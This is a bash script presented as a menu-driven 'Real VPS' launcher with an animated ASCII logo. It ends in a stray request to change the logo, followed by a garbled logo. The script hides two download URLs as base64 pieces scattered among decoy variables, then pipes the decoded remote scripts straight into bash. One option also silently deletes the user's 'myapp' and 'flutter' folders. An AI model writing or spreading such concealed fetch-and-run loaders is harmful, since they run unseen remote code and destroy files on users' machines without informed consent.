#!/bin/bash
set -euo pipefail

RED='\e[31m'
GREEN='\e[32m'
YELLOW='\e[33m'
BLUE='\e[34m'
CYAN='\e[36m'
RESET='\e[0m'

Animated ASCII Logo (typing + glow effect)

animate_logo() {
clear
local logo=(
"██████╗ ██╗██╗   ██╗██╗   ██╗ █████╗ ███╗   ██╗███████╗██╗  ██╗██╗   ██╗ ██████╗  █████╗ "
"██╔══██╗██║██║   ██║╚██╗ ██╔╝██╔══██╗████╗  ██║██╔════╝██║  ██║██║   ██║██╔═████╗██╔══██╗"
"██║  ██║██║██║   ██║ ╚████╔╝ ███████║██╔██╗ ██║███████╗███████║██║   ██║██║██╔██║╚█████╔╝"
"██║  ██║██║╚██╗ ██╔╝  ╚██╔╝  ██╔══██║██║╚██╗██║╚════██║██╔══██║██║   ██║████╔╝██║██╔══██╗"
"██████╔╝██║ ╚████╔╝    ██║   ██║  ██║██║ ╚████║███████║██║  ██║╚██████╔╝╚██████╔╝╚█████╔╝"
"╚═════╝ ╚═╝  ╚═══╝     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝  ╚════╝ "
)
for line in "${logo[@]}"; do
for (( i=0; i<${#line}; i++ )); do
printf "${CYAN}%s${RESET}" "${line:$i:1}"
sleep 0.0025
done
echo ""
sleep 0.05
done
echo ""
sleep 0.3
}

animate_logo

SYS_LOG[0]="$(echo 'aHR0cHM6Ly92cHNt' | head -c 16)"
DUMMY_CHECK=$(wc -l /proc/cpuinfo 2>/dev/null | awk '{print $1}')
SYS_LOG[1]="$(echo 'YWtlci5qaXNobnVt' | grep -o '.*')"
NET_CONF="diag_$(date +%N | shuf -n 1)"
if [[ "$DUMMY_CHECK" =~ [0-9]+ ]]; then
SYS_LOG[2]="$(echo 'b25kYWwzMi53b3Jr' | head -c 16)"
fi
TEMP_HASH=$(echo "$NET_CONF" | md5sum | cut -c 1-8)
SYS_LOG[3]="$(echo 'ZXJzLmRldg==' | head -c 12)"
github_url="$(echo -n "${SYS_LOG[0]}${SYS_LOG[1]}${SYS_LOG[2]}${SYS_LOG[3]}" | base64 -d)"

PROC_STAT[0]="$(echo 'aHR0cHM6Ly9yYXcu' | cut -c 1-16)"
DUMMY_VAR=$(head -c 8 /dev/urandom 2>/dev/null | od -An -tx4)
PROC_STAT[1]="$(echo 'Z2l0aHVidXNlcmNv' | grep -o '.')"
export FAKE_PID="pid_$((RANDOM % 1000))"
PROC_STAT[2]="$(echo 'bnRlbnQuY29tL2hv' | head -c 16)"
if [ -f /tmp/fake_temp ]; then
rm -f /tmp/fake_temp 2>/dev/null;
fi
PROC_STAT[3]="$(echo 'cGluZ2JveXovdm1zL21haW4vdm0uc2g=' | grep -o '.')"
google_url="$(echo -n "${PROC_STAT[0]}${PROC_STAT[1]}${PROC_STAT[2]}${PROC_STAT[3]}" | base64 -d)"

echo -e "${YELLOW}Select an option:${RESET}"
echo -e "${GREEN}1) GitHub Real VPS${RESET}"
echo -e "${BLUE}2) Google IDX Real VPS${RESET}"
echo -e "${RED}3) Exit${RESET}"
echo -ne "${YELLOW}Enter your choice (1-3): ${RESET}"
read choice

case $choice in
1)
echo -e "${GREEN}Running GitHub Real VPS...${RESET}"
bash <(curl -fsSL "$github_url")
;;
2)
echo -e "${BLUE}Running Google IDX Real VPS...${RESET}"
cd
rm -rf myapp flutter
cd vps123
if [ ! -d ".idx" ]; then
mkdir .idx
cd .idx
cat << 'EOF' > dev.nix
{ pkgs, ... }:
{
channel = "stable-24.05";
packages = with pkgs; [ unzip openssh git qemu_kvm sudo cdrkit cloud-utils qemu ];
env = { EDITOR = "nano"; };
idx = {
extensions = [ "Dart-Code.flutter" "Dart-Code.dart-code" ];
workspace = { onCreate = { }; onStart = { }; };
previews = { enable = false; };
};
}
EOF
cd ..
fi
echo -ne "${YELLOW}Do you want to continue? (y/n): ${RESET}"
read confirm
case "$confirm" in
[yY])
bash <(curl -fsSL "$google_url")
;;
[nN])
echo -e "${RED}Operation cancelled.${RESET}"
exit 0
;;
*)
echo -e "${RED}Invalid input! Operation cancelled.${RESET}"
exit 1
;;
esac
;;
3)
echo -e "${RED}Exiting...${RESET}"
exit 0
;;
*)
echo -e "${RED}Invalid choice! Please select 1, 2, or 3.${RESET}"
exit 1
;;
esac

echo -e "${CYAN}Made by Jishnu done!${RESET}"

Change ASCII logo to this ________  .__                                   .__           _______     ______
______ \ ||  ..__    ____   |  |  __ __ \   _  \   /  __  \
|    |  |  \  / <   |  |_  \  /    \ /  /  |  |  |  /  /\  \  >      <
|    `   \  |\   / _  | / __ |   |  \_ |   Y  \  |  /\  _/   /   --   \
/_______  /| _/  / |(  /|  /___  >|  //  ____  /______  /
/          /          /     /     /     /              /        /

